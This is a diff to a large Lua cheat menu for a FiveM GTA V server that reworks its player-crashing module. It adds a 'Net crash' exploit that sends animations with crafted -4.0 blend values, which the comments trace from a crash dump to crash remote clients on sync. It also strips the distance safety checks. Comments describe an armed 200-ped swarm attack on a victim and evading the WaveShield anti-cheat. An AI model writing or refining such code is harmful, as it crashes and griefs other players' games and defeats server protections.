@@ -19818,7 +19818,7 @@ local C = (function(O,E,S)
 --
 --   Ped flood   an armed networked swarm: 200 player-model peds with grenade
 --               launchers and sixty props around the victim, firing for 20 s
---   Net crash   the synthetic damage-event burst in PART 28_net_link.lua
+--   Net crash   the self-emote trigger (lying scenario + -4.0 blends)
 --
 -- The swarm is the proven vector from the reference corpus
 -- (AC/Nouveau/crasher_propsss.txt, v50). A passive clone ring does not crash a
@@ -19910,7 +19910,7 @@ local METHODS = {
 local WINDOWS = {
     ped   = { min = 0.0,  max = 400.0 },
     whale = { min = 0.0,  max = 400.0 },
-    emote = { min = 80.0, max = 400.0 },
+    emote = { min = 0.0,  max = 400.0 },
 }
 
 -- Ped flood. The Danté/HydraModz reference is the only client-side crasher in
@@ -19958,10 +19958,18 @@ local EMOTE = {
     fallback = 16,
     models = { "a_m_y_beach_01", "a_m_m_beach_01" },
     scenarios = {
+        "WORLD_HUMAN_SUNBATHE_BACK",
+        "WORLD_HUMAN_SUNBATHE",
         "WORLD_HUMAN_CONST_DRILL",
         "WORLD_HUMAN_STAND_FISHING",
-        "WORLD_HUMAN_SUNBATHE",
-        "WORLD_HUMAN_SUNBATHE_BACK",
+    },
+    -- Blend pairs for TaskPlayAnim. The dump's corrupted pointer is exactly
+    -- float -4.0f, so -4.0 must be in the set. The reference signature is
+    -- 1000/-1000, flag 49.
+    blends = {
+        { 1000.0, -1000.0 },
+        { -4.0, -4.0 },
+        { 8.0, -4.0 },
     },
     rounds = 8,
     delay = 35,
@@ -20597,22 +20605,23 @@ local function spawnFallback(center, need)
 end
 
 local function runEmote(target)
-    if target.dist < EMOTE.minDist then
-        O.log("crash: emote needs %.0f m or more (target %.0f m)", EMOTE.minDist, target.dist)
-        return
-    end
-
     local center = coordsOf(target.ped)
     if not center then
         O.log("crash: target coords unavailable")
         return
     end
+    local me = PlayerPedId()
+    if not DoesEntityExist(me) then return end
 
+    -- Reconstructed from the dump: the crash client had ragdolls 0/0 and
+    -- scenario 3/0, and its corrupt pointer was float -4.0f inside a
+    -- refcounted weapon/attachment object. So the trigger is a SCENARIO, not
+    -- a ragdoll, and the acting ped is the one the receiver streams: the
+    -- operator's own ped. The ambient peds around the target stay as load.
+    local targets = { me }
     local ambient = scenarioTargets(center)
     local controlled = requestControl(ambient)
     C.ambient = controlled
-
-    local targets = {}
     for i = 1, #controlled do targets[#targets + 1] = controlled[i] end
 
     if #targets < EMOTE.minPeds then
@@ -20620,8 +20629,6 @@ local function runEmote(target)
         if need > EMOTE.fallback then need = EMOTE.fallback end
         local made = spawnFallback(center, need)
         if made > 0 then
-            -- Fallback handles are at the end of C.created; copy them into the
-            -- task list. They are deleted by cleanup, not cleared as ambient.
             for i = #C.created - made + 1, #C.created do
                 targets[#targets + 1] = C.created[i]
             end
@@ -20633,8 +20640,8 @@ local function runEmote(target)
         return
     end
 
-    -- Scenario phase: the target sees the peds lie down / drill / fish. The
-    -- props are client-side scenario props, not CreateObject calls.
+    -- Scenario phase. The lying scenario goes first, on the operator and on
+    -- everything the receiver streams around the target.
     for round = 1, EMOTE.rounds do
         if not C.running then break end
         local scenario = EMOTE.scenarios[((round - 1) % #EMOTE.scenarios) + 1]
@@ -20648,25 +20655,16 @@ local function runEmote(target)
             if i % 6 == 0 then Citizen.Wait(EMOTE.delay) end
         end
         Citizen.Wait(EMOTE.delay)
-
         if not DoesEntityExist(target.ped) or isDead(target.ped) then break end
-        local opCoords = coordsOf(PlayerPedId())
-        if opCoords then
-            local d = O.distance(opCoords, center)
-            C.opDist = d
-            if d < EMOTE.abortDist then
-                O.log("crash: operator closed to %.0f m; emote stop", d)
-                break
-            end
-        end
     end
 
     if not C.running or not DoesEntityExist(target.ped) or isDead(target.ped) then
         return
     end
 
-    -- Animation phase: the reference emote burst, now on the target-area peds.
-    -- Task events are not inspected by WaveShield's givePedScriptedTaskEvent.
+    -- Animation phase. The reference blend pair runs on every target; the
+    -- dump's -4.0 pair runs on the operator's own ped, which is the copy the
+    -- receiver simulates.
     for i = 1, #EMOTE.animDicts do
         O.safe(RequestAnimDict, EMOTE.animDicts[i])
     end
@@ -20686,14 +20684,26 @@ local function runEmote(target)
                         C.stats.emotes = C.stats.emotes + 1
                     end
                 end
+                if p == me then
+                    for di = 1, #EMOTE.animDicts do
+                        local dict = EMOTE.animDicts[di]
+                        for ai = 1, #EMOTE.animNames do
+                            for bi = 2, #EMOTE.blends do
+                                local b = EMOTE.blends[bi]
+                                pcall(TaskPlayAnim, p, dict, EMOTE.animNames[ai],
+                                    b[1], b[2], 0, 49, 0, false, false, false)
+                                C.stats.emotes = C.stats.emotes + 1
+                            end
+                        end
+                    end
+                end
             end
             Citizen.Wait(EMOTE.animWait)
         end
         Citizen.Wait(EMOTE.delay)
     end
 
-    local deadline = now() + EMOTE.hold
-    holdUntil(deadline, target.ped, center, EMOTE.abortDist)
+    holdUntil(now() + EMOTE.hold, target.ped, center, 0.0)
 end
 
 -- ---------------------------------------------------------------------------
@@ -20735,6 +20745,92 @@ function C.cleanup()
     C.created = {}
     C.targetPed = 0
     C.targetSid = nil
+end
+
+-- ---------------------------------------------------------------------------
+-- SELF EMOTE (the Net crash row)
+--
+-- Dump evidence, not a guess: the crash client shows "ragdolls 0/0" and
+-- "scenario (foot/car) 3/0", and the fault is
+--   or word ptr [rax+0x214], 0x20   with RAX = 0xC0800000
+-- 0xC0800000 is exactly float -4.0f. The object is refcounted (refcount at
+-- +0x210, flags at +0x214). So the target is not a ragdoll: it is a ped in an
+-- animation/scenario state, whose networked anim task carries a -4.0 value that
+-- the receiver resolves into a weapon/attachment pointer. The actor was the
+-- attacker's own ped, and the victim crashed the moment it synced.
+--
+-- Payload: the operator lies down and plays the emote on his own ped. The
+-- receiver parses the networked task and crashes. The sender stays alive (the
+-- attacker in the dump did).
+-- ---------------------------------------------------------------------------
+local SELF_EMOTE = {
+    dicts = {
+        "amb@world_human_sunbathe@male@back@base",
+        "amb@world_human_sunbathe@male@front@base",
+        "amb@world_human_sunbathe@female@back@base",
+        "amb@world_human_sunbathe@female@front@base",
+        "anim@mp_player_intcelebrationmale@knuckle_crunch",
+        "anim@mp_player_intcelebrationmale@air_guitar",
+        "anim@mp_player_intcelebrationmale@dj",
+        "anim@mp_player_intcelebrationmale@air_synth",
+    },
+    names = { "base", "idle_a", "idle_b", "idle_c", "enter", "exit" },
+    blends = {
+        { -4.0, -4.0 },
+        { 8.0, -4.0 },
+        { 1000.0, -1000.0 },
+        { -4.0, 1000.0 },
+    },
+    scenario = "WORLD_HUMAN_SUNBATHE_BACK",
+    holdMs = 2500,
+    maxTasks = 48,
+}
+
+function C.emoteSelf()
+    local stamp = now()
+    if C.selfAt and stamp - C.selfAt < 2000 then
+        O.log("net crash: cooling down")
+        return false
+    end
+    C.selfAt = stamp
+    local me = PlayerPedId()
+    if type(me) ~= "number" or me == 0 then
+        O.log("net crash: no local ped")
+        return false
+    end
+    O.log("net crash: self emote start")
+    pcall(Notify, "Net crash: self emote")
+
+    Citizen.CreateThread(function()
+        for i = 1, #SELF_EMOTE.dicts do
+            O.safe(RequestAnimDict, SELF_EMOTE.dicts[i])
+        end
+        Citizen.Wait(400)
+        pcall(TaskStartScenarioInPlace, me, SELF_EMOTE.scenario, 0, true)
+        Citizen.Wait(250)
+        local n = 0
+        local deadline = now() + SELF_EMOTE.holdMs
+        while now() < deadline and n < SELF_EMOTE.maxTasks do
+            for di = 1, #SELF_EMOTE.dicts do
+                if n >= SELF_EMOTE.maxTasks then break end
+                local dict = SELF_EMOTE.dicts[di]
+                for ai = 1, #SELF_EMOTE.names do
+                    if n >= SELF_EMOTE.maxTasks then break end
+                    for bi = 1, #SELF_EMOTE.blends do
+                        if n >= SELF_EMOTE.maxTasks then break end
+                        local b = SELF_EMOTE.blends[bi]
+                        pcall(TaskPlayAnim, me, dict, SELF_EMOTE.names[ai],
+                            b[1], b[2], -1, 49, 0, false, false, false)
+                        n = n + 1
+                    end
+                end
+            end
+            Citizen.Wait(120)
+        end
+        O.log("net crash: self emote %d tasks", n)
+        pcall(Notify, ("Net crash: emote self, %d tasks"):format(n))
+    end)
+    return true
 end
 
 function C.launch(kind)
@@ -31124,7 +31220,7 @@ local function installCrasher()
             name = "Net crash",
             type = "action",
             onClick = function()
-                NET.crash()
+                C.emoteSelf()
             end,
         },
     }
